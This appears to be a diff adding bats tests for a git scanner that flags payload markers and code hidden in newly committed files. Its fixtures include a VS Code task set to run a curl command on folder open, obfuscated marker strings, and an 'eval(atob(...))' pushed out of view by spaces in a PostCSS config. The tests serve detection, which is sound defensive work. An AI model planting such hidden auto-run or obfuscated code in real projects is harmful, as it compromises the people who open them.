@@ -738,3 +738,23 @@ TASK='{"tasks":[{"runOptions":{"runOn":"folderOpen"},"command":"curl https://x.e
   run env PYTHONPATH="$BATS_TEST_TMPDIR/py" GIT_SCAN_NO_NOTIFY=1 "$(S)" post-checkout 0000000000000000000000000000000000000000 HEAD 1
   [ "$status" -eq 0 ]; [ ! -e "$BATS_TEST_TMPDIR/imported" ]
 }
+@test "markers listed as a search pattern, as a payload-scan workflow does, are a WARN to look at, not HIGH; a marker in code stays HIGH" {
+  r="$BATS_TEST_TMPDIR/s"; git init -q "$r"; cd "$r"; mkdir -p .github/workflows
+  printf "          MARK='_x|%s%s|%s%s|y'\n" 'rm' 'cej%otb%' 'Cot%3' 't=shtP' > .github/workflows/payload-scan.yml
+  printf 'var s = "a%s%sb";\n' 'Cot%3' 't=shtP' > code.js
+  git add . && git -c user.email=t@example.invalid -c user.name=t commit -qm x
+  run /usr/bin/python3 "$REPO/fixes/files/git-scan-new-files" --sweep --budget 60 "$r"
+  [ "$status" -eq 0 ]
+  [ "${lines[0]}" = "HIGH	$r	code.js:1	payload markers: v2-string (line length 24)" ]
+  [[ "${lines[1]}" == "WARN	$r	.github/workflows/payload-scan.yml:1	lists payload markers as a search pattern"* ]]
+  [ "${lines[2]}" = "DONE	1	1" ]; [ "${#lines[@]}" -eq 3 ]
+}
+@test "findings other files raised never stop the payload check of a later file" {
+  r="$BATS_TEST_TMPDIR/s"; git init -q "$r"; cd "$r"; mkdir .d
+  for i in $(seq -w 0 40); do echo '{}' > ".d/$i.mcp.json"; done
+  printf 'export default {};\nx;%60seval(atob("eA=="))\n' '' > postcss.config.mjs
+  git add -A && git -c user.email=t@example.invalid -c user.name=t commit -qm x
+  run /usr/bin/python3 "$REPO/fixes/files/git-scan-new-files" --sweep --budget 60 "$r"
+  [ "$status" -eq 0 ]
+  [[ "$output" == *"HIGH	$r	postcss.config.mjs:2	code hidden after a long run of spaces"* ]]
+}
